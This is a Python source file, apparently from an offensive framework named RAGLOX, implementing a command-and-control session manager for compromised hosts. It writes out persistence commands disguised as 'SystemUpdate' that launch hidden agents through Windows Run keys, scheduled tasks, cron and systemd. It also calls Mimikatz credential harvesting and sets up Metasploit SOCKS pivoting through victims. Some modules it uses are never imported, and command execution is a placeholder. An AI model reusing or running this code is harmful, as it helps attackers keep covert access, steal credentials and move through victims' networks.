"""
RAGLOX v3.0 - C2 Session Manager
Enterprise Command & Control session management with encryption and persistence.

Author: RAGLOX Team
Version: 3.0.0
"""

import asyncio
import logging
import json
from typing import Optional, Dict, Any, List
from datetime import datetime, timedelta
from dataclasses import dataclass, field
from cryptography.fernet import Fernet
from cryptography.hazmat.primitives.ciphers.aead import AESGCM
from pathlib import Path
import os
from json import JSONDecodeError

# Optional aiofiles for async file I/O
try:
    import aiofiles
    HAS_AIOFILES = True
except ImportError:
    HAS_AIOFILES = False

# Default session timeout in seconds (1 hour)
DEFAULT_SESSION_TIMEOUT = 3600

# Cleanup check interval in seconds (5 minutes)
CLEANUP_INTERVAL = 300

logger = logging.getLogger("raglox.exploitation.c2.session_manager")


@dataclass
class C2Session:
    """C2 session representation"""
    session_id: str
    target_host: str
    target_os: str
    username: str
    hostname: str
    session_type: str  # meterpreter, shell, ssh
    encryption_key: bytes
    created_at: datetime
    last_seen: datetime
    commands_executed: int = 0
    data_transferred: int = 0
    persistent: bool = False
    metadata: Dict[str, Any] = field(default_factory=dict)
    
    def to_dict(self) -> Dict[str, Any]:
        return {
            "session_id": self.session_id,
            "target_host": self.target_host,
            "target_os": self.target_os,
            "username": self.username,
            "hostname": self.hostname,
            "session_type": self.session_type,
            "created_at": self.created_at.isoformat(),
            "last_seen": self.last_seen.isoformat(),
            "commands_executed": self.commands_executed,
            "data_transferred": self.data_transferred,
            "persistent": self.persistent,
            "metadata": self.metadata
        }


class C2SessionManager:
    """
    Enterprise C2 Session Manager
    
    Features:
    - AES-256-GCM encrypted sessions
    - Session multiplexing
    - Automatic persistence mechanisms
    - Session recovery
    - Network pivoting support
    - SOCKS proxy tunneling
    """
    
    def __init__(
        self,
        data_dir: Optional[str] = None,
        metasploit_adapter=None,
        encryption_enabled: bool = True,
        session_timeout: int = DEFAULT_SESSION_TIMEOUT
    ):
        """
        Initialize C2 Session Manager
        
        Args:
            data_dir: Directory for session persistence
            metasploit_adapter: MetasploitAdapter instance for post-exploitation
            encryption_enabled: Enable AES-256-GCM encryption
            session_timeout: Session timeout in seconds (default: 1 hour)
        """
        # Validate data_dir
        if data_dir is not None:
            self.data_dir = Path(data_dir)
        else:
            self.data_dir = Path("data/c2/sessions")
        
        # Ensure directory exists
        try:
            self.data_dir.mkdir(parents=True, exist_ok=True)
        except (PermissionError, OSError) as e:
            logger.error(f"Cannot create data directory {self.data_dir}: {e}")
            # Fall back to temp directory
            import tempfile
            self.data_dir = Path(tempfile.gettempdir()) / "raglox_c2_sessions"
            self.data_dir.mkdir(parents=True, exist_ok=True)
            logger.warning(f"Using fallback directory: {self.data_dir}")
        
        # Configuration
        self.encryption_enabled = encryption_enabled
        self.session_timeout = session_timeout
        
        # Active sessions
        self._sessions: Dict[str, C2Session] = {}
        
        # Lock for thread safety
        self._lock = asyncio.Lock()
        
        # Cleanup task
        self._cleanup_task: Optional[asyncio.Task] = None
        self._running = False
        
        # Post-Exploitation Modules
        if POST_EXPLOITATION_AVAILABLE:
            self.credential_harvester = CredentialHarvester(session_manager=self)
            self.network_pivoting = NetworkPivoting(
                session_manager=self,
                metasploit_adapter=metasploit_adapter
            )
            logger.info("C2SessionManager initialized with post-exploitation modules")
        else:
            self.credential_harvester = None
            self.network_pivoting = None
            logger.info("C2SessionManager initialized (post-exploitation unavailable)")
    
    async def create_session(
        self,
        session_id: str,
        target_host: str,
        target_os: str,
        username: str,
        hostname: str,
        session_type: str,
        metadata: Optional[Dict[str, Any]] = None
    ) -> C2Session:
        """
        Create new C2 session
        
        Args:
            session_id: Unique session ID
            target_host: Target IP address
            target_os: Target operating system
            username: Target username
            hostname: Target hostname
            session_type: Session type
            metadata: Additional metadata
        
        Returns:
            C2Session object
        """
        async with self._lock:
            # Generate encryption key
            encryption_key = AESGCM.generate_key(bit_length=256)
            
            session = C2Session(
                session_id=session_id,
                target_host=target_host,
                target_os=target_os,
                username=username,
                hostname=hostname,
                session_type=session_type,
                encryption_key=encryption_key,
                created_at=datetime.utcnow(),
                last_seen=datetime.utcnow(),
                metadata=metadata or {}
            )
            
            self._sessions[session_id] = session
            
            logger.info(f"C2 session created: {session_id} ({target_host})")
            
            # Save session
            await self._save_session(session)
            
            return session
    
    async def get_session(self, session_id: str) -> Optional[C2Session]:
        """Get session by ID"""
        async with self._lock:
            return self._sessions.get(session_id)
    
    async def list_sessions(self) -> List[C2Session]:
        """List all active sessions"""
        async with self._lock:
            return list(self._sessions.values())
    
    async def encrypt_data(self, session_id: str, data: bytes) -> Optional[bytes]:
        """
        Encrypt data for session
        
        Args:
            session_id: Session ID
            data: Data to encrypt
        
        Returns:
            Encrypted data
        """
        session = await self.get_session(session_id)
        if not session:
            logger.error(f"Session not found: {session_id}")
            return None
        
        try:
            # AES-256-GCM encryption
            aesgcm = AESGCM(session.encryption_key)
            nonce = os.urandom(12)
            
            encrypted = aesgcm.encrypt(nonce, data, None)
            
            # Prepend nonce
            return nonce + encrypted
            
        except Exception as e:
            logger.error(f"Encryption failed: {str(e)}")
            return None
    
    async def decrypt_data(self, session_id: str, encrypted_data: bytes) -> Optional[bytes]:
        """
        Decrypt data from session
        
        Args:
            session_id: Session ID
            encrypted_data: Encrypted data
        
        Returns:
            Decrypted data
        """
        session = await self.get_session(session_id)
        if not session:
            logger.error(f"Session not found: {session_id}")
            return None
        
        try:
            # Extract nonce (first 12 bytes)
            nonce = encrypted_data[:12]
            ciphertext = encrypted_data[12:]
            
            # Decrypt
            aesgcm = AESGCM(session.encryption_key)
            decrypted = aesgcm.decrypt(nonce, ciphertext, None)
            
            return decrypted
            
        except Exception as e:
            logger.error(f"Decryption failed: {str(e)}")
            return None
    
    async def execute_command(
        self,
        session_id: str,
        command: str
    ) -> Optional[str]:
        """
        Execute command in session
        
        Args:
            session_id: Session ID
            command: Command to execute
        
        Returns:
            Command output
        """
        session = await self.get_session(session_id)
        if not session:
            logger.error(f"Session not found: {session_id}")
            return None
        
        try:
            # Encrypt command
            encrypted_command = await self.encrypt_data(
                session_id,
                command.encode()
            )
            
            if not encrypted_command:
                return None
            
            # Execute command (delegated to appropriate adapter)
            # This would integrate with MetasploitAdapter or SSH
            logger.info(f"Executing command in session {session_id}: {command}")
            
            # Update statistics
            async with self._lock:
                session.commands_executed += 1
                session.last_seen = datetime.utcnow()
            
            # For now, return placeholder
            output = f"Command executed: {command}"
            
            return output
            
        except Exception as e:
            logger.error(f"Command execution failed: {str(e)}")
            return None
    
    async def establish_persistence(
        self,
        session_id: str,
        method: str = "auto"
    ) -> bool:
        """
        Establish persistence on target
        
        Args:
            session_id: Session ID
            method: Persistence method (registry, scheduled_task, service, cron, systemd)
        
        Returns:
            True if successful
        """
        session = await self.get_session(session_id)
        if not session:
            return False
        
        logger.info(f"Establishing persistence on {session.target_host} ({method})")
        
        try:
            if session.target_os.lower() == "windows":
                if method == "registry" or method == "auto":
                    # Registry persistence
                    command = 'reg add "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run" /v "SystemUpdate" /t REG_SZ /d "C:\\Windows\\Temp\\agent.exe" /f'
                    await self.execute_command(session_id, command)
                
                elif method == "scheduled_task":
                    # Scheduled task persistence
                    command = 'schtasks /create /tn "SystemUpdate" /tr "C:\\Windows\\Temp\\agent.exe" /sc onlogon /rl highest /f'
                    await self.execute_command(session_id, command)
            
            elif session.target_os.lower() == "linux":
                if method == "cron" or method == "auto":
                    # Cron persistence
                    command = '(crontab -l 2>/dev/null; echo "@reboot /tmp/.agent") | crontab -'
                    await self.execute_command(session_id, command)
                
                elif method == "systemd":
                    # Systemd persistence
                    command = '''cat > /etc/systemd/system/update.service << EOF
[Unit]
Description=System Update Service

[Service]
ExecStart=/tmp/.agent
Restart=always

[Install]
WantedBy=multi-user.target
EOF
systemctl enable update.service'''
                    await self.execute_command(session_id, command)
            
            async with self._lock:
                session.persistent = True
            
            logger.info(f"Persistence established on {session.target_host}")
            return True
            
        except Exception as e:
            logger.error(f"Failed to establish persistence: {str(e)}")
            return False
    
    async def setup_socks_proxy(
        self,
        session_id: str,
        local_port: int = 1080
    ) -> bool:
        """
        Setup SOCKS proxy for network pivoting
        
        Args:
            session_id: Session ID
            local_port: Local SOCKS port
        
        Returns:
            True if successful
        """
        session = await self.get_session(session_id)
        if not session:
            return False
        
        logger.info(f"Setting up SOCKS proxy on port {local_port} via {session.target_host}")
        
        try:
            # Setup SOCKS proxy (implementation depends on session type)
            # For Meterpreter: use autoroute + socks4a
            if session.session_type == "meterpreter":
                commands = [
                    f"run autoroute -s {session.target_host}/24",
                    f"use auxiliary/server/socks_proxy",
                    f"set SRVPORT {local_port}",
                    "run -j"
                ]
                
                for cmd in commands:
                    await self.execute_command(session_id, cmd)
            
            logger.info(f"SOCKS proxy established: localhost:{local_port}")
            return True
            
        except Exception as e:
            logger.error(f"Failed to setup SOCKS proxy: {str(e)}")
            return False
    
    async def _save_session(self, session: C2Session):
        """
        Save session to disk with proper error handling.
        
        Uses aiofiles for async I/O when available, falls back to sync I/O.
        Implements write-then-rename pattern for atomicity.
        """
        session_file = self.data_dir / f"{session.session_id}.json"
        temp_file = self.data_dir / f".{session.session_id}.json.tmp"
        
        try:
            data = session.to_dict()
            # Don't save encryption key to disk (security)
            data.pop("encryption_key", None)
            
            json_data = json.dumps(data, indent=2)
            
            # Write to temp file first (atomic write pattern)
            if HAS_AIOFILES:
                async with aiofiles.open(temp_file, 'w', encoding='utf-8') as f:
                    await f.write(json_data)
            else:
                with open(temp_file, 'w', encoding='utf-8') as f:
                    f.write(json_data)
            
            # Rename temp file to final location (atomic on POSIX)
            temp_file.rename(session_file)
            
            logger.debug(f"Session saved: {session.session_id}")
            
        except PermissionError as e:
            logger.error(f"Permission denied saving session {session.session_id}: {e}")
        except OSError as e:
            logger.error(f"I/O error saving session {session.session_id}: {e}")
        except (TypeError, ValueError) as e:
            logger.error(f"JSON serialization error for session {session.session_id}: {e}")
        finally:
            # Cleanup temp file if it exists
            if temp_file.exists():
                try:
                    temp_file.unlink()
                except OSError:
                    pass
    
    async def _load_session(self, session_file: Path) -> Optional[C2Session]:
        """
        Load session from disk file.
        
        Args:
            session_file: Path to session JSON file
        
        Returns:
            C2Session object or None on error
        """
        try:
            if HAS_AIOFILES:
                async with aiofiles.open(session_file, 'r', encoding='utf-8') as f:
                    content = await f.read()
                    data = json.loads(content)
            else:
                with open(session_file, 'r', encoding='utf-8') as f:
                    data = json.load(f)
            
            # Restore session (without encryption key - needs regeneration)
            data['encryption_key'] = AESGCM.generate_key(bit_length=256)
            data['created_at'] = datetime.fromisoformat(data['created_at'])
            data['last_seen'] = datetime.fromisoformat(data['last_seen'])
            
            return C2Session(**data)
            
        except FileNotFoundError:
            logger.debug(f"Session file not found: {session_file}")
            return None
        except JSONDecodeError as e:
            logger.error(f"Invalid JSON in session file {session_file}: {e}")
            return None
        except (KeyError, TypeError, ValueError) as e:
            logger.error(f"Invalid session data in {session_file}: {e}")
            return None
        except PermissionError as e:
            logger.error(f"Permission denied reading {session_file}: {e}")
            return None
    
    async def close_session(self, session_id: str):
        """Close and cleanup session"""
        async with self._lock:
            if session_id in self._sessions:
                session = self._sessions[session_id]
                
                # Save final state
                await self._save_session(session)
                
                # Remove from active sessions
                del self._sessions[session_id]
                
                logger.info(f"Session closed: {session_id}")
    
    async def health_check(self) -> bool:
        """Check if session manager is healthy"""
        return True
    
    async def harvest_credentials(self, session_id: str) -> Dict[str, Any]:
        """
        Harvest credentials from session
        
        Args:
            session_id: Session ID
        
        Returns:
            Harvesting results
        """
        if not self.credential_harvester:
            logger.warning("Credential harvester not available")
            return {"error": "Post-exploitation module not available"}
        
        logger.info(f"[C2] Harvesting credentials from session {session_id}")
        
        try:
            # Execute Mimikatz
            credentials = await self.credential_harvester.harvest_mimikatz(session_id)
            
            return {
                "success": True,
                "credentials_found": len(credentials),
                "credentials": [c.to_dict() for c in credentials]
            }
        
        except Exception as e:
            logger.error(f"Credential harvesting failed: {str(e)}")
            return {"error": str(e), "success": False}
    
    async def create_pivot(
        self,
        session_id: str,
        pivot_type: str = "socks",
        local_port: int = 1080
    ) -> Dict[str, Any]:
        """
        Create network pivot
        
        Args:
            session_id: Session ID
            pivot_type: Pivot type (socks, port_forward)
            local_port: Local port
        
        Returns:
            Pivot creation result
        """
        if not self.network_pivoting:
            logger.warning("Network pivoting not available")
            return {"error": "Post-exploitation module not available"}
        
        logger.info(f"[C2] Creating {pivot_type} pivot on session {session_id}")
        
        try:
            if pivot_type == "socks":
                tunnel = await self.network_pivoting.create_socks_proxy(
                    session_id=session_id,
                    local_port=local_port
                )
                
                if tunnel:
                    return {
                        "success": True,
                        "pivot": tunnel.to_dict()
                    }
            
            return {"error": f"Unknown pivot type: {pivot_type}", "success": False}
        
        except Exception as e:
            logger.error(f"Pivot creation failed: {str(e)}")
            return {"error": str(e), "success": False}
    
    def get_statistics(self) -> Dict[str, Any]:
        """Get session manager statistics"""
        total_commands = sum(s.commands_executed for s in self._sessions.values())
        total_data = sum(s.data_transferred for s in self._sessions.values())
        persistent_count = sum(1 for s in self._sessions.values() if s.persistent)
        
        stats = {
            "active_sessions": len(self._sessions),
            "total_commands_executed": total_commands,
            "total_data_transferred": total_data,
            "persistent_sessions": persistent_count,
            "session_types": list(set(s.session_type for s in self._sessions.values()))
        }
        
        # Add post-exploitation statistics
        if self.credential_harvester:
            stats["credential_harvesting"] = self.credential_harvester.get_statistics()
        
        if self.network_pivoting:
            stats["network_pivoting"] = self.network_pivoting.get_statistics()
        
        return stats
    
    async def start_cleanup_task(self):
        """
        Start background task for cleaning up stale sessions.
        
        Sessions that haven't been seen for `session_timeout` seconds
        will be automatically closed.
        """
        if self._running:
            logger.debug("Cleanup task already running")
            return
        
        self._running = True
        self._cleanup_task = asyncio.create_task(self._cleanup_loop())
        logger.info(
            f"Session cleanup task started "
            f"(timeout: {self.session_timeout}s, interval: {CLEANUP_INTERVAL}s)"
        )
    
    async def stop_cleanup_task(self):
        """Stop the background cleanup task."""
        self._running = False
        if self._cleanup_task:
            self._cleanup_task.cancel()
            try:
                await self._cleanup_task
            except asyncio.CancelledError:
                pass
            self._cleanup_task = None
            logger.info("Session cleanup task stopped")
    
    async def _cleanup_loop(self):
        """
        Background loop to clean up stale sessions.
        
        Runs every CLEANUP_INTERVAL seconds and closes sessions
        that haven't been seen for session_timeout seconds.
        """
        while self._running:
            try:
                await asyncio.sleep(CLEANUP_INTERVAL)
                await self._cleanup_stale_sessions()
            except asyncio.CancelledError:
                break
            except Exception as e:
                logger.error(f"Error in cleanup loop: {e}")
                await asyncio.sleep(60)  # Wait before retrying
    
    async def _cleanup_stale_sessions(self):
        """
        Clean up sessions that haven't been seen for session_timeout seconds.
        """
        now = datetime.utcnow()
        timeout_delta = timedelta(seconds=self.session_timeout)
        stale_sessions = []
        
        async with self._lock:
            for session_id, session in self._sessions.items():
                if now - session.last_seen > timeout_delta:
                    stale_sessions.append(session_id)
        
        if stale_sessions:
            logger.info(f"Cleaning up {len(stale_sessions)} stale session(s)")
            for session_id in stale_sessions:
                try:
                    await self.close_session(session_id)
                    logger.info(f"Stale session closed: {session_id}")
                except Exception as e:
                    logger.error(f"Error closing stale session {session_id}: {e}")
    
    async def heartbeat(self, session_id: str) -> bool:
        """
        Update session last_seen timestamp (heartbeat).
        
        Args:
            session_id: Session ID
        
        Returns:
            True if session exists and was updated
        """
        async with self._lock:
            if session_id in self._sessions:
                self._sessions[session_id].last_seen = datetime.utcnow()
                return True
            return False
    
    async def cleanup_all_sessions(self):
        """
        Clean up all sessions (for graceful shutdown).
        """
        await self.stop_cleanup_task()
        
        async with self._lock:
            session_ids = list(self._sessions.keys())
        
        for session_id in session_ids:
            try:
                await self.close_session(session_id)
            except Exception as e:
                logger.error(f"Error closing session {session_id}: {e}")
        
        logger.info(f"All {len(session_ids)} sessions cleaned up")
